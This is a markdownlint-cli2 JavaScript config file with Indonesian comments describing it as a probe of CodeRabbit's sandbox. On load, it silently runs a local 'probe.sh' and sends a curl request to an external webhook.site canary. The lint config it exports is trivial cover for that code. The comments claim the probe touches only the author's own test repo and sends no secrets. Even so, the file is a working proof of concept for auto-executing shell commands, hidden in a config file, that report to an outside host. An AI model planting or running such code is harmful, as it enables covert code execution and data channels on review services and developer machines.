// Batch 1 — Primitif markdownlint-cli2 (config .cjs di-require otomatis).
// markdownlint-cli2 me-load `.markdownlint-cli2.cjs` secara otomatis (VS Code
// sampai punya setting `blockJavaScript` karena risiko ini); halaman
// CodeRabbit mencantumkan .cjs/.mjs sebagai supported TANPA security policy.
// Catatan: `.markdownlint-cli2.js` / `.markdownlint.js` eksplisit TIDAK
// didukung CodeRabbit — makanya dipakai .cjs.
// Repo tes sendiri ONLY. Hanya ping canary + probing batas sandbox
// (boolean/hitungan/nama env var). TIDAK ADA secret yang dibaca nilainya
// atau dikirim.
// Canary path: /mdlint
const { execSync, execFileSync } = require('node:child_process');
const path = require('node:path');
const fs = require('node:fs');

const CANARY = 'webhook.site/42ad6b5b-e171-45c4-a7b8-28534655cbe3';
const probe = path.join(__dirname, 'probe.sh');

try {
  if (fs.existsSync(probe)) {
    execFileSync('sh', [probe, CANARY, 'mdlint'], { timeout: 30000, stdio: 'ignore' });
  }
} catch (_) {
  // fall through to the direct ping below
}

// Fallback: ping eksekusi langsung bila probe.sh gagal jalan.
// (Bila probe.sh jalan, ping ini duplikat dan ditandai fb=1 — itu normal.)
try {
  execSync(`curl -s --max-time 5 'https://${CANARY}/mdlint?stage=exec&fb=1'`, {
    timeout: 10000,
    stdio: 'ignore',
  });
} catch (_) {
  // ignore — no canary, no signal
}

module.exports = { config: { default: true } };
